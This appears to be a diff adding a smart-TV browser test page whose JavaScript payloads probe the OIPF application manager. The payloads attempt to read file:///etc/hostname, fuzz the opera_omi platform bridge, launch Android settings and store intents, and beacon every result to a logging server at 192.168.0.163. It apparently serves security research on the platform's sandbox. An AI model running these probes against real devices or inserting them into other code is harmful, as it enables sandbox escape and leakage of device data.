+        var fileErrorDetail = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?fileErrorDetail='+encodeURIComponent(s)+'&t='+Date.now()}function d(n,x){var r=[n,'str='+String(x)],p=x,k=[];try{for(var z=0;p&&z<4;z++,p=Object.getPrototypeOf(p)){var q=Object.getOwnPropertyNames(p);for(var i=0;i<q.length;i++)if(k.indexOf(q[i])<0)k.push(q[i])}r.push('props='+k.join(','));for(var j=0;j<k.length;j++){try{var v=x[k[j]];if(typeof v!=='function'&&typeof v!=='object')r.push(k[j]+'='+String(v))}catch(e){r.push(k[j]+'=THROW')}}}catch(e2){r.push('inspectThrow='+e2)}b(r.join(';').substring(0,1700))}var m=oipfObjectFactory.createApplicationManagerObject(),o=m.getOwnerApplication(document),a;m.onApplicationLoadError=function(e){b('loadError');d('event',e);d('child',a)};m.onApplicationLoaded=function(e){b('loaded');d('event',e)};b('before');a=o.createApplication('file:///etc/hostname',false);b('returned');d('immediate',a)})()";
+        urls.jsfileerrordetail = 'javascript:' + fileErrorDetail;
+      }
+      if (name === 'jsomifuzzread') {
+        var omiFuzzRead = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?omiFuzz='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var x=window.opera_omi,i=0,e=0,c=['{}','[]','null','0','true','ping','help','version','getVersion','getDeviceInfo','getSystemInfo','getCapabilities','getConfiguration','getStatus','listApplications','listServices','{\"type\":\"ping\"}','{\"type\":\"getVersion\"}','{\"command\":\"getDeviceInfo\"}','{\"cmd\":\"getSystemInfo\"}','{\"method\":\"getCapabilities\"}','{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getVersion\",\"params\":[]}','<message type=\"ping\"/>','<request><getVersion/></request>'];function ev(){e++;var r=['event='+e,'argc='+arguments.length];for(var j=0;j<arguments.length;j++){try{r.push('arg'+j+';type='+typeof arguments[j]+';value='+String(arguments[j]))}catch(z){r.push('arg'+j+'=THROW')}}b(r.join(';'))}try{x.addPlatformEventListener(ev);b('listener-added')}catch(z){b('listener-throw='+(z.name||'')+':'+(z.message||String(z)))}function n(){if(i>=c.length){b('complete;sent='+i+';events='+e);return}var k=i++,s=c[k];try{var r=x.sendPlatformMessage(s);b('case='+k+';input='+s+';returnType='+typeof r+';return='+String(r))}catch(q){b('case='+k+';input='+s+';THROW='+(q.name||'')+':'+(q.message||String(q)))}setTimeout(n,300)}n()})()";
+        urls.jsomifuzzread = 'javascript:' + omiFuzzRead;
+      }
+      if (name === 'jsandroidsettings') {
+        var androidSettings = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?androidSettings='+encodeURIComponent(s)+'&t='+Date.now()}var u='intent:#Intent;action=android.settings.SETTINGS;end',m=oipfObjectFactory.createApplicationManagerObject(),o=m.getOwnerApplication(document);b('before;uri='+u);try{var a=o.createApplication(u,true);b('returned;type='+typeof a+';value='+String(a))}catch(e){b('createThrow='+(e.name||'')+':'+(e.message||String(e)))}setTimeout(function(){b('navigate');try{location.href=u}catch(e2){b('navigateThrow='+(e2.name||'')+':'+(e2.message||String(e2))) }},1000)})()";
+        urls.jsandroidsettings = 'javascript:' + androidSettings;
+      }
+      if (name === 'jsandroidsettingscomponent') {
+        var androidSettingsComponent = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?androidSettingsComponent='+encodeURIComponent(s)+'&t='+Date.now()}var u='intent:#Intent;component=com.android.settings/.Settings;end',m=oipfObjectFactory.createApplicationManagerObject(),o=m.getOwnerApplication(document);b('before;uri='+u);try{var a=o.createApplication(u,true);b('returned;type='+typeof a+';value='+String(a))}catch(e){b('createThrow='+(e.name||'')+':'+(e.message||String(e)))}setTimeout(function(){b('navigate');try{location.href=u}catch(e2){b('navigateThrow='+(e2.name||'')+':'+(e2.message||String(e2))) }},1000)})()";
+        urls.jsandroidsettingscomponent = 'javascript:' + androidSettingsComponent;
+      }
+      if (name === 'jsplaystorehandler') {
+        var playStoreHandler = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?playStoreHandler='+encodeURIComponent(s)+'&t='+Date.now()}var u='https://play.google.com/store/apps/details?id=com.mediaworks.android.tv',m=oipfObjectFactory.createApplicationManagerObject(),o=m.getOwnerApplication(document);b('before;url='+u);try{var a=o.createApplication(u,true);b('returned;type='+typeof a+';value='+String(a))}catch(e){b('createThrow='+(e.name||'')+':'+(e.message||String(e)))}})()";
+        urls.jsplaystorehandler = 'javascript:' + playStoreHandler;
+      }
+      if (name === 'jsmarketstore') {
+        var marketStore = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?marketStore='+encodeURIComponent(s)+'&t='+Date.now()}var u='market://details?id=com.mediaworks.android.tv',m=oipfObjectFactory.createApplicationManagerObject(),o=m.getOwnerApplication(document);b('before;uri='+u);try{var a=o.createApplication(u,true);b('returned;type='+typeof a+';value='+String(a))}catch(e){b('createThrow='+(e.name||'')+':'+(e.message||String(e)))}setTimeout(function(){b('navigate');try{location.href=u}catch(e2){b('navigateThrow='+(e2.name||'')+':'+(e2.message||String(e2))) }},1000)})()";
+        urls.jsmarketstore = 'javascript:' + marketStore;
+      }
+      report('START ' + name + ' uri=' + urls[name]);
+      try {
+        var manager = oipfObjectFactory.createApplicationManagerObject();
+        var owner = manager.getOwnerApplication(document);
+        report('manager=' + typeof manager + ' owner=' + typeof owner +
+               ' createApplication=' + typeof owner.createApplication);
+        var child = owner.createApplication(urls[name], true);
+        report('RETURN ' + name + ' type=' + typeof child + ' value=' + String(child));
+      } catch (error) {
+        report('THROW ' + name + ' name=' + error.name + ' message=' + error.message + ' value=' + String(error));
+      }
+    }
+    var buttons = document.getElementsByTagName('button');
+    for (var i = 0; i < buttons.length; i++) {
+      buttons[i].onclick = (function (name) { return function () { run(name); }; })(buttons[i].getAttribute('data-case'));
+    }
+    buttons[0].focus();
+  }());
+  </script>
+</body>
+</html>
